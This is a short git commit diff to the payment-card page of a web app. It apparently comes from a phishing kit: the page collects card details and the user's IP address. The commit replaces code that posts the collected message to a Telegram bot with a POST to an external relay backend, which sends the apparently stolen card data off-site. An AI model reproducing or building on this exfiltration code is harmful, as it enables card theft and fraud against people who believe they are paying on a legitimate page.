90cb1a4059b45cd7d0031fad0551af442d494ec4
AboIslam123179 <tiktokqatr@gmail.com>
2025-10-01 03:55:41 +0300

    Update page.js

--- app/card/page.js
+++ app/card/page.js
@@ -101,17 +101,11 @@ export default function PaymentPage() {
       sessionStorage.setItem("User IP", ipAddress);
 
       try {
-        const response = await fetch(
-          `https://api.telegram.org/bot${botToken}/sendMessage`,
-          {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message,
-            }),
-          }
-        );
+      const response = await fetch("https://wuaze-qata-backend.vercel.app/send", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ text: message }),
+      });
 
         if (response.ok) {
           const expireDate = `${expiryMonth} / ${expiryYear}`;
